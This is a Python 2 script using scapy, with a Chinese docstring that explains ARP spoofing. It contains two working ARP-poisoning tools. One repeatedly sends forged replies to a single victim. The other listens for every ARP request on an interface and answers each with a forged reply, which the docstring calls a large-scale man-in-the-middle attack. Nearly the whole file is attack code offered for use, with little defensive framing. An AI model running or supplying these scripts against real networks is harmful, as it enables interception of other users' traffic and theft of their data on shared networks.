#!/usr/bin/env python
# coding: utf-8

"""
一台计算机想要发IP包到另一台计算机，必须先通过ARP协议来获取目标的mac地址。
这个请求包先被广播到网络中，理想的情况下，只有目标机会应答。
攻击者可以每隔几秒中就向受害者发送ARP回复包，但包中的mac地址用的是攻击者的地址。
如此一来，就将连接劫持到了自己电脑。

使用中间人攻击代码的时候我们应该检查相应的端口是否打开，要开启相应的程序来接受数据包

code simple是简单的单方向中间人攻击，只能劫持从client发送到server的包，
不能获取server返回client的包。并且简单粗暴，耗费流量。

code 2 简单粗暴的劫持了所有的ARP协议，造成大规模的中间人攻击
"""

"""
# code simple
import sys
import time
from scapy.all import sendp, ARP, Ether

if len(sys.argv) < 3:
    #garget 是受害者， spoof是要访问的ip
    print sys.argv[0] + ": <target> <spoof_ip>"
    sys.exit(1)

iface = "eth0"
target_ip = sys.argv[1]
fake_ip = sys.argv[2]

ethernet = Ether()
arp = ARP(pdst=target_ip, psrc=fake_ip, op="is-at")
packet = ethernet / arp

while True:
    sendp(packet, iface=iface)
    time.sleep(10)
"""

# code 2
import sys
from scapy.all import sniff, sendp, ARP, Ether


if len(sys.argv) < 2:
    print sys.argv[0] + " <iface>"
    sys.exit(0)


def arp_posion_callback(packet):
    if packet[ARP].op ==1:
        answer = Ether(dst=packet[ARP].hwsrc) / ARP()
        answer[ARP].op = "is-at"
        answer[ARP].hwdst = packet[ARP].hwsrc
        answer[ARP].psrc = packet[ARP].pdst
        answer[ARP].pdst = packet[ARP].psrc
        print "Fooling " + packet[ARP].psrc + " that " + packet[ARP].dst + " is me"
        sendp(answer, iface=sys.argv[1])

sniff(prn=arp_posion_callback, filter="arp", iface=sys.argv[1], store=0)
